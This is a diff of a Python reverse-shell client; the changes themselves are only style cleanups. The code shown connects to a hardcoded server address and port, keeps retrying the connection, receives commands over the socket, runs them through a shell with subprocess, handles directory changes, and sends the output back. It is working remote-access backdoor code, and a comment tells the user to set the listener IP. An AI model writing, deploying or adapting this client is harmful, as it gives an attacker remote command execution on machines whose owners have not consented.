@@ -6,10 +6,11 @@ import signal
 import sys
 import struct
 
+
 class Client(object):
 
     def __init__(self):
-        self.serverHost = '192.168.1.2' # Change the ip address !
+        self.serverHost = '192.168.1.2'  # Change the ip address !
         self.serverPort = 9999
         self.socket = None
 
@@ -66,20 +67,21 @@ class Client(object):
         try:
             self.socket.recv(10)
         except Exception as e:
-            print('Could not start communication with server: %s\n' %str(e))
+            print('Could not start communication with server: %s\n' % str(e))
             return
         cwd = str.encode(str(os.getcwd()) + '> ')
         self.socket.send(struct.pack('>I', len(cwd)) + cwd)
         while True:
             output_str = None
             data = self.socket.recv(20480)
-            if data == b'': break
+            if data == b'': 
+                break
             elif data[:2].decode("utf-8") == 'cd':
                 directory = data[3:].decode("utf-8")
                 try:
                     os.chdir(directory.strip())
                 except Exception as e:
-                    output_str = "Could not change directory: %s\n" %str(e)
+                    output_str = "Could not change directory: %s\n" % str(e)
                 else:
                     output_str = ""
             elif data[:].decode("utf-8") == 'quit':
@@ -87,17 +89,20 @@ class Client(object):
                 break
             elif len(data) > 0:
                 try:
-                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    cmd = subprocess.Popen(
+                          data[:].decode("utf-8"), 
+                          shell=True, stdout=subprocess.PIPE, 
+                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     output_bytes = cmd.stdout.read() + cmd.stderr.read()
                     output_str = output_bytes.decode("utf-8", errors="replace")
                 except Exception as e:
-                    output_str = "Command execution unsuccessful: %s\n" %str(e)
+                    output_str = "Command execution unsuccessful: %s\n" % \
+                                 str(e)
             if output_str is not None:
                 try:
                     self.print_output(output_str)
                 except Exception as e:
-                    print('Cannot send command output: %s' %str(e))
+                    print('Cannot send command output: %s' % str(e))
         self.socket.close()
         return
 
@@ -110,7 +115,7 @@ def main():
         try:
             client.socket_connect()
         except Exception as e:
-            print("Error on socket connections: %s" %str(e))
+            print("Error on socket connections: %s" % str(e))
             time.sleep(5)
         else:
             break
